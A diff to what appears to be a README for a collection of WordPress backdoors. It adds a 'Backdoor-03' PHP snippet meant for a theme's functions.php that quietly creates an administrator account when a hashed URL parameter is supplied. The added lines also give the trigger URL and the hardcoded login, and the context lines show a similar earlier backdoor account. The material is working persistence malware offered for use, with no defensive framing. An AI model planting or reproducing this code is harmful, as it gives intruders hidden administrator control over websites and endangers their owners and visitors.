@@ -50,7 +50,38 @@ https://www.targetdomain.com?backdoor=go
 - User: backdooradmin
  - Password: Pa55W0rd
 
-![Logo](https://github.com/cyber-insect99/photo-gallery-/blob/main/Screenshot_2.png?raw=true)
+
+
+
+## Backdoor-03 (add to theme functions.php)
+
+
+
+
+
+
+```bash
+
+add_action( 'wp_head', 'my_backdoor' );
+
+function my_backdoor() {
+    if ( md5( $_GET['backdoor'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
+        require( 'wp-includes/registration.php' );
+        if ( !username_exists( 'cyber_insect99' ) ) {
+            $user_id = wp_create_user( 'cyber_insect99', 'pass' );
+            $user = new WP_User( $user_id );
+            $user->set_role( 'administrator' ); 
+        }
+    }
+}
+
+
+```
+https://www.targetdomain.com?backdoor=go
+- User: cyber_insect99
+ - Password: pass
+
+
 
 
 
